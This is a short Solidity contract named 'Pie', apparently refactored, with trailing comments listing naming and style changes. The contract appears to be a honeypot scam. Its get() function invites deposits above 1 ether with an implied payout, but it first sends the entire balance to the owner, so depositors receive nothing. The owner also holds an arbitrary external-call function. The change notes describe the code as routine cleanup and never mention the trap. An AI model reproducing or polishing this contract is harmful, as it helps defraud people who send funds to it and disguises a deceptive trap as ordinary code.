pragma solidity ^0.4.19;

contract Pie {
    address public owner = msg.sender;

    function() public payable {}

    function get() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        bool success = adr.call.value(msg.value)(data);
        require(success);
    }
} 

// Changes Made:
// 1. Renamed Owner to owner to follow naming convention.
// 2. Removed unnecessary if statement in withdraw() function.
// 3. Added boolean variable to check the success of external call in command() function.
// 4. Renamed Get() function to get() to follow naming convention.